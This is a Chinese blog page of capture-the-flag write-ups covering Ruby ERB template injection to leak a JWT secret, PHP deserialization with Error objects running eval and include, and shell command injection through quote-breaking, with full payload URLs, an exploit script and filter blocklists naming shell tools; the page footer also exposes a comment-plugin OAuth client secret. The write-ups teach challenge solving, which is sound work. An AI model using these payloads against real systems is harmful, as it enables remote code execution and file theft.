<p>还真是 jwt  看了一下key的生成 <code>ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)</code>这肯定我们无法伪造 然后就没思路了</p>
<p>看了wp 发现涉及ERB模板注入</p>
<p>ERB模板注入格式是<code>&lt;%=其他%&gt;</code></p>
<p>直接来看怎样获取flag</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = <span class="variable constant_">JWT</span>.decode cookies[<span class="symbol">:auth</span>],<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> <span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts <span class="variable constant_">ENV</span>[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + <span class="title class_">SecureRandom</span>.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = <span class="variable constant_">JWT</span>.encode auth,<span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    <span class="variable constant_">ERB</span><span class="symbol">:</span><span class="symbol">:new</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><code>params[:变量名]</code>这里应该就是get请求名 虽然不太懂ruby 但是大致能猜出</p>
<p><code>params[:name][0,7]</code>我们输入的name不能超过7个字符</p>
<p>前面说到我们只能输入7个字符的name 除去模板注入的<code>&lt;%=%&gt;</code>已经占据了五个字符 我们能控制的只有两个了</p>
<p>这里需要用到Ruby语言的一个特性 我们可以利用<code>$&#39;</code>来返回正则匹配结果的右边  </p>
<ul>
<li><code>$&#39;</code> 最后一次模式匹配中匹配部分之后的字符串  </li>
</ul>
<p>比如<code>hello world </code>设置匹配e 那么就会返回<code>llo world</code></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="variable constant_">ENV</span>[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">  puts <span class="variable constant_">ENV</span>[<span class="string">&quot;FLAG&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>这里就是在用环境中secret与我们输入的secret进行匹配 如果我们输入secret为空</p>
<p>那么<code>$&#39;</code>就会帮我们完整的值输出</p>
<p>所以payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/work?SECRET=&amp;name=&lt;%=$&#x27;%&gt;&amp;do=&lt;%=$&#x27;%&gt; is working</span><br></pre></td></tr></table></figure>

<p>避免歧义进行url编码后打入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/work?SECRET=&amp;name=%3C%25%3D$&#x27;%25%3E&amp;do=%3C%25%3D$&#x27;%25%3E%20is%20working </span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689156469993-1fe293bf-0731-4bb9-afa1-1baea4c66837.png" alt="img"></p>
<p>得到了key 然后jwt伪造 打入抓包 再解码就可以得到flag了</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689156517393-2b00eb8d-8b8f-483c-bd18-6283d478d58c.png" alt="img"></p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689156526111-41289877-d5fe-43b4-995b-8a5c3c2fe4c0.png" alt="img"></p>
<h1 id="110、-GYCTF2020-Easyphp"><a href="#110、-GYCTF2020-Easyphp" class="headerlink" title="110、[GYCTF2020]Easyphp"></a>110、[GYCTF2020]Easyphp</h1><p>代码审计先放着 太抽象了 大概看了一下涉及反序列化字符串逃逸 sql注入等等 之后再来填坑把。</p>
<h1 id="111、-极客大挑战-2020-Greatphp"><a href="#111、-极客大挑战-2020-Greatphp" class="headerlink" title="111、[极客大挑战 2020]Greatphp"></a>111、[极客大挑战 2020]Greatphp</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">class</span> <span class="variable constant_">SYCLOVER</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function __wakeup()&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable">$this</span>-&gt;syc != <span class="variable">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="variable">$this</span>-&gt;syc) === md5(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="variable">$this</span>-&gt;syc)=== sha1(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               eval(<span class="variable">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               die(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="variable constant_">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>给了源码 那么最重要的就是这个等式成立</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover))</span><br></pre></td></tr></table></figure>

<p>一般我们可以通过传数组 就可以bypass 但是这道题目是在类中 所以这个方法就不能用了</p>
<p>因此这里用到了新知识点：<strong>md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toString 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 __toString 方法。</strong>  </p>
<p>所以我们可以通过用含有<code>__toString</code>方法的内置类进行绕过，这里用的是Exception 和 Error （随便选一个哪个都可以）</p>
<p>他们有 __toString 方法，当类被当做字符串处理时，就会调用这个函数。  </p>
<p>一个简单的demo来理解 偷的</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line"><span class="variable">$a</span> = new <span class="title class_">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = new <span class="title class_">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">echo <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">echo <span class="variable">$b</span>;</span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里我们将类当作字符串进行输出就会调用我们内置类中单<code>__toString</code>魔术方法</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689246050444-e2bd3402-2a56-4bfb-a11a-4fc596dab0f3.png" alt="img"></p>
<p>所以 <code>$a!=$b</code>但是我们输出的内容确是相同的</p>
<p>注意这里我们将<code>$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);</code>放在同一行了 因为输出的内容包含我们的行数 所以为了满足条件成立 就要放在同一行</p>
<p>接着看正则将我们单双引号括号都waf了 我们可以include 包含flag文件 然后flag文件可以通过取反的方式绕过</p>
<p>exp:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">class</span> <span class="variable constant_">SYCLOVER</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = new <span class="variable constant_">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;syc = new <span class="title class_">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$a</span>-&gt;lover = new <span class="title class_">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);<span class="comment">#注意要在一行才行</span></span><br><span class="line">echo urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:<code>?great=O%3A8%3A%22SYCLOVER%22%3A2%3A%7Bs%3A3%3A%22syc%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22E%3A%5Ccode%5Ctest%5C1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A10%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A5%3A%22lover%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22E%3A%5Ccode%5Ctest%5C1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A10%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D</code></p>
<p>说明：<code>?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;</code>为什么要在前面加<code>?&gt;</code></p>
<p>Exception 类与 Error 的 __toString 方法在eval()函数中输出的结果是不可能控的</p>
<p>因为输出的报错信息中，payload前面还有一段杂乱信息<code>Error: </code>    </p>
<p>就比如我们之前的那个demo</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689247105099-87f2d3e4-1a74-4363-a461-6001c373d7c0.png" alt="img"></p>
<p>进入eval()函数就会以这样的形式：<code>eval(&quot;...Error: &lt;?php payload ?&gt;&quot;)</code></p>
<p>所以我们要用sql注入的思想 <code>?&gt;</code> 来闭合一下</p>
<p><code>eval(&quot;...Error: ?&gt;&lt;?php payload ?&gt;&quot;)</code>，这样我们的恶意代码就可以顺利执行了。  </p>
<p>参考：<a target="_blank" rel="noopener" href="https://johnfrod.top/ctf/2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98greatphp/">https://johnfrod.top/ctf/2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98greatphp/</a></p>
<h1 id="112、EasyBypass"><a href="#112、EasyBypass" class="headerlink" title="112、EasyBypass"></a>112、EasyBypass</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="variable constant_">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$comm1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;comm1&#x27;</span>];</span><br><span class="line"><span class="variable">$comm2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;comm2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, <span class="variable">$comm1</span>))</span><br><span class="line">    <span class="variable">$comm1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;</span>, <span class="variable">$comm2</span>))</span><br><span class="line">    <span class="variable">$comm2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;#flag in /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$comm1</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$comm1</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$comm2</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$comm2</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;file $comm1 $comm2&quot;</span>;</span><br><span class="line">system(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>给了源码 comm1没有过滤tac 因此我们就在这里构造</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689248080086-9b602508-dccd-4faa-91e1-1503e8ef5b58.png" alt="img"></p>
<p>这道题目最重要的就是利用闭合的思想</p>
<p><code>$cmd = &quot;file $comm1 $comm2&quot;;</code>这句就是我们闭合逃逸的最重要的一句</p>
<p>file需要一个文件 那么我们就给他的一个index.php然后用”;去闭合</p>
<p>也就是<code>$cmd = &quot;file index.php&quot;; $comm2&quot;;</code></p>
<p>再加上我们的恶意代码 构造<code>index.php&quot;;tac /fla?;&quot;</code></p>
<p>原式就会被我们构造成以下三段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cmd = &quot;file index.php&quot;;</span><br><span class="line">tac /fla?;</span><br><span class="line">&quot; $comm2&quot;;</span><br></pre></td></tr></table></figure>

<p>成功bypass</p>
<p>payload：<code>?comm1=index.php&quot;;tac /fla?;&quot;&amp;comm2=1</code></p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/post/4fb535d6.html" rel="prev" title="ctfshow-反序列化">
                  <i class="fa fa-chevron-left"></i> ctfshow-反序列化
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/post/d33f9f0e.html" rel="next" title="buu刷题（page 4-2）">
                  buu刷题（page 4-2） <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments gitalk-container"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">陇ICP备2023001761号-1 </a>
  </div>

<div class="copyright">
  &copy; 2023.2 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Z1d10t</span>
</div>



    </div>
  </footer>

  

  <a href="https://github.com/Z1d10t" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  




<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"Z1d10t","repo":"Z1d10t.github.io","client_id":"c9dd41fa890386350257","client_secret":"c78f6b60a410862c2dcc596f09db2f0c06f025c6","admin_user":"Z1d10t","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"e0b6bb149b825c2fa1badb5b96f89629"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>

</body>
</html>

